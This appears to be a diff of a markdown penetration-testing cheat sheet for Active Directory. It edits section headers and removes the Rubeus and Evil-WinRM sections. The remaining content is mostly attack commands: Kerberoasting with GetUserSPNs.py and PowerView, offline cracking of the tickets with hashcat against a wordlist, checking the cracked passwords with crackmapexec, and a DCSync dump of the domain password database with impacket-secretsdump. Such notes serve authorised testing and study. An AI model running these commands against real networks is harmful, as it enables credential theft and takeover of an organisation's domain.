@@ -44,7 +44,7 @@ GET NTLMV2UNIQUE
 ```
 # Kerberoasting
 Get SPN tickets and crack offline
-### Kerberoasting with GetUserSPNs.py (KALI)
+### Kerberoasting with GetUserSPNs.py (From Attack machine)
 ``` bash
 #Requires username and password of domain user
 #List SPN Accounts with GetUserSPNs.py
@@ -59,7 +59,7 @@ hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt
 #after succesfull crack, test authentication against DC
 sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWD>
 ```
-### Kerberoasting (WINDOWS) with powerview
+### Kerberoasting with powerview (TARGET MACHINE) 
 ``` powershell
 #https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/README.md
 #Import module
@@ -78,16 +78,6 @@ hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt
 sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWD>
 #the we can use PSCredential Object for movement (Check Lateral Movement tab)
 ```
-### Kerberoasting (WINDOWS) with Rubeus
-``` powershell
-#https://github.com/GhostPack/Rubeus
-#get high-value targets
-.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
-#Crack with hashcat mode 13100
-hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt 
-#after succesfull crack, test authentication against DC
-sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWD>
-```
 # DCSync
 Steal AD password Db by using the built-in `Directory Replication Service Remote Protocol`. Requires user with DCSync Privileges
 ``` bash
@@ -96,9 +86,4 @@ Steal AD password Db by using the built-in `Directory Replication Service Remot
 impacket-secretsdump -outputfile inlanefreight_hashes -just-dc <DOMAIN>/<USERNAME>@<IP> 
 # You can Check user that has this option enabled. DCSync will provide these creds in cleartext (optional?) Powershell:
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
-```
-# Evil-WinRM
-``` bash
-#Connect to target with Evil-WinRM and valid creds
-evil-winrm -i <IP> -u <USER>
 ```
